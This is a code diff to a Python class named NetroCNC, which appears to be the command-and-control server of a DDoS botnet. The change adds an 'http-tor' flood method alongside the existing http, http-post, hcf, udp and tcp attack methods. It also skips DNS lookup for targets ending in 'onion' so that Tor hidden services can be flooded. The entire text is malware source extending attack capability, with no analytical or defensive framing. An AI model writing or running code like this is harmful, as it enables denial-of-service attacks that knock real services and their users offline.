@@ -183,7 +183,7 @@ class NetroCNC(object):
         if len(args) < 1:
             return "Missing command arguments. Type \"help\" to show the launch command manual."
         
-        attack_methods = ["http", "hcf", "http-post", "udp", "tcp"]
+        attack_methods = ["http", "http-post", "http-tor", "hcf", "udp", "tcp"]
         attack_method = args[0].lower()
 
         if not attack_method in attack_methods:
@@ -196,6 +196,8 @@ class NetroCNC(object):
                 return self.attack_method_http(args=args, http_method="http")
             case "http-post":
                 return self.attack_method_http(args=args, http_method="http-post")
+            case "http-tor":
+                return self.attack_method_http(args=args, http_method="http-tor")
             case "hcf":
                 return self.attack_method_http(args=args, http_method="hcf")
             case "tcp":
@@ -211,7 +213,8 @@ class NetroCNC(object):
 
             parsed = urlparse(url)
 
-            socket.gethostbyname(parsed.hostname)
+            if not parsed.hostname.endswith("onion"):
+                socket.gethostbyname(parsed.hostname)
 
             if not parsed.scheme in ["http", "https"]:
                 raise Exception
